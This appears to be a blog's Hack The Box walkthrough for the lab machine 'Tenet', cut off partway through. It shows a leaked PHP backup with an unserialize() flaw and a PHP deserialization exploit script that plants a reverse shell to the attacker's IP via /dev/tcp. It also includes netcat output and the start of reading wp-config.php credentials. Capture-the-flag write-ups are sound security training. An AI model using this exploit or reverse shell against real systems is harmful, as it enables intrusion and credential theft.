@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	16 Jan 2021IP:	10.10.10.223">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-walkthrough[Tenet]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/01/18/tenet/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="introduceOS:	 LinuxDifficulty:	MediumPoints:	30Release:	16 Jan 2021IP:	10.10.10.223">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb161.jpg">
+<meta property="og:image" content="http://www.hackthebox.eu/badge/image/235857">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb162.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb163.jpg">
+<meta property="article:published_time" content="2021-01-18T03:23:15.000Z">
+<meta property="article:modified_time" content="2021-06-13T18:19:39.173Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="HackTheBox靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb161.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/01/18/tenet/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/01/18/tenet/","path":"2021/01/18/tenet/","title":"Hack-The-Box-walkthrough[Tenet]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-walkthrough[Tenet] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#introduce"><span class="nav-number">1.</span> <span class="nav-text">introduce</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">2.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WEBSITE"><span class="nav-number">3.</span> <span class="nav-text">WEBSITE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXPLOITING-PART"><span class="nav-number">4.</span> <span class="nav-text">EXPLOITING PART</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WWW-DATA-to-USER"><span class="nav-number">5.</span> <span class="nav-text">WWW-DATA to USER</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#USER-to-ROOT"><span class="nav-number">6.</span> <span class="nav-text">USER to ROOT</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">6.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/01/18/tenet/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-walkthrough[Tenet] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-walkthrough[Tenet]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-18 11:23:15" itemprop="dateCreated datePublished" datetime="2021-01-18T11:23:15+08:00">2021-01-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-06-14 02:19:39" itemprop="dateModified" datetime="2021-06-14T02:19:39+08:00">2021-06-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/HackTheBox-walkthrough/" itemprop="url" rel="index"><span itemprop="name">HackTheBox walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h3><p>OS:	 Linux<br>Difficulty:	Medium<br>Points:	30<br>Release:	16 Jan 2021<br>IP:	10.10.10.223</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb161.jpg"></p>
+</li>
+<li><p><img src="http://www.hackthebox.eu/badge/image/235857" alt="my htb rank"></p>
+</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usaul</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/tenet]</span><br><span class="line">└─<span class="comment"># nmap -sV -v -p- --min-rate=10000 10.10.10.223</span></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<h3 id="WEBSITE"><a href="#WEBSITE" class="headerlink" title="WEBSITE"></a>WEBSITE</h3><p>It’s just a Default page :&#x2F; nothing there, let’s add tenet.htb to our &#x2F;etc&#x2F;hosts file</p>
+<p>Yep, there’s a vhost running there and its tenet.htb, Let’s enum there for sometime</p>
+<p>I just scrolled down and got a Recent comments section, when I click that It takes me to the comments page</p>
+<p>So note here a user commented, “did you remove the sator php file and the backup?”</p>
+<p>also we got a username (neil) here take a note of it 🙂</p>
+<p>I enumed for sometime and stucked here for sometime, they’re saying we migrating, so looks like there’s another vhost and It would be sator coz the user talking about it</p>
+<p>So I added sator.tenet.htb to my &#x2F;etc&#x2F;hosts</p>
+<p>It worked 🙂 but now I’m trying to find that php backup file, so I got 404 here. let me back when I find that file :&#x2F;</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sator.tenet.htb/sator.php</span><br></pre></td></tr></table></figure>
+
+<p>Somehow I managed to find the file but I can’t able to read it :&#x2F;</p>
+<p>When I added .bak to the url, I can able to download it 😀</p>
+<p>And here’s that file👇</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/tenet]</span><br><span class="line">└─<span class="comment"># cat sator.php.bak </span></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class DatabaseExport</span><br><span class="line">&#123;</span><br><span class="line">        public <span class="variable">$user_file</span> = <span class="string">&#x27;users.txt&#x27;</span>;</span><br><span class="line">        public <span class="variable">$data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        public <span class="keyword">function</span> <span class="function"><span class="title">update_db</span></span>()</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;[+] Grabbing users from text file &lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="variable">$this</span>-&gt; data = <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">        &#123;</span><br><span class="line">                file_put_contents(__DIR__ . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$this</span> -&gt;user_file, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;[] Database updated &lt;br&gt;&#x27;</span>;</span><br><span class="line">        //      <span class="built_in">echo</span> <span class="string">&#x27;Gotta get this working properly...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$input</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;arepo&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$databaseupdate</span> = unserialize(<span class="variable">$input</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = new DatabaseExport;</span><br><span class="line"><span class="variable">$app</span> -&gt; update_db();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>We need to perform php object Injection also called as deserialization</p>
+<p>If you’re new to this topic then you must go through these things, then you can able to understand this exploit</p>
+<ul>
+<li><p>FOR REFERENCE:</p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1IYVcxNWFNekJVTSZmZWF0dXJlPXlvdXR1LmJl">Intro to PHP Deserialization<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL3N3bGgvZXhwbG9pdGluZy1waHAtZGVzZXJpYWxpemF0aW9uLTU2ZDcxZjAzMjgyYQ==">Exploiting PHP deserialization<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+</ul>
+<h3 id="EXPLOITING-PART"><a href="#EXPLOITING-PART" class="headerlink" title="EXPLOITING PART"></a>EXPLOITING PART</h3><p>So here I made a file to get shell in just one command</p>
+<ul>
+<li>getShell.php</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class DatabaseExport</span><br><span class="line">&#123;</span><br><span class="line">        public <span class="variable">$user_file</span> = <span class="string">&#x27;revshell.php&#x27;</span>;</span><br><span class="line">                                               //Change YOUR IP AND PORT HERE vvvvvvvvv</span><br><span class="line">        public <span class="variable">$data</span> = <span class="string">&#x27;&lt;?php exec(&quot;/bin/bash -c \&#x27;</span>bash -i &gt; /dev/tcp/10.10.14.2/5555 0&gt;&amp;1\<span class="string">&#x27;&quot;); ?&gt;&#x27;</span>;</span><br><span class="line">        public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()</span><br><span class="line">        &#123;</span><br><span class="line">                file_put_contents(__DIR__ . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$this</span> -&gt;user_file, <span class="variable">$this</span>-&gt;data);</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&#x27;[EXPLOITED] Check your netcat :D   [FOLLOW lUc1f3r11]&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://10.10.10.223/sator.php?arepo=&#x27;</span> . urlencode(serialize(new DatabaseExport));</span><br><span class="line"><span class="variable">$response</span> = file_get_contents(<span class="string">&quot;<span class="variable">$url</span>&quot;</span>);</span><br><span class="line"><span class="variable">$response</span> = file_get_contents(<span class="string">&quot;http://10.10.10.223/revshell.php&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Just you need to change the IP and port in the 6th line and I marked it too,</p>
+<p>Then start your netcat and run this file, php getShell.php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/tenet]</span><br><span class="line">└─<span class="comment"># php getshell.php </span></span><br><span class="line">[EXPLOITED] Check your netcat :D   [FOLLOW lUc1f3r11]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/tenet]</span><br><span class="line">└─<span class="comment"># nc -lvp 5555</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::5555</span><br><span class="line">Ncat: Listening on 0.0.0.0:5555</span><br><span class="line">Ncat: Connection from 10.10.10.223.</span><br><span class="line">Ncat: Connection from 10.10.10.223:40482.</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">You also have python3 installed, you can run <span class="string">&#x27;python3&#x27;</span> instead.</span><br><span class="line"></span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@tenet:/var/www/html$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">www-data@tenet:/var/www/html$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">index.html    sator.php      shell.php  wordpress</span><br><span class="line">revshell.php  sator.php.bak  users.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="WWW-DATA-to-USER"><a href="#WWW-DATA-to-USER" class="headerlink" title="WWW-DATA to USER"></a>WWW-DATA to USER</h3><p>Remember this is a wordpress site so we need to find credentials based on that,</p>
+<p>So as I said we need to enum based on wordpress name, then I got creds for the user neil in &#x2F;var&#x2F;www&#x2F;html&#x2F;wordpress folder and filename “wp-config.php”</p>
+<p>ssh into the box</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">www-data@tenet:/var/www/html/wordpress$ <span class="built_in">cat</span> wp-config.php</span><br><span class="line"><span class="built_in">cat</span> wp-config.php</span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration <span class="keyword">for</span> WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="string"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * This file contains the following configurations:</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * * MySQL settings</span></span><br><span class="line"><span class="string"> * * Secret keys</span></span><br><span class="line"><span class="string"> * * Database table prefix</span></span><br><span class="line"><span class="string"> * * ABSPATH</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @link https://wordpress.org/support/article/editing-wp-config-php/</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define( &#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>neil<span class="string">&#x27; );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** 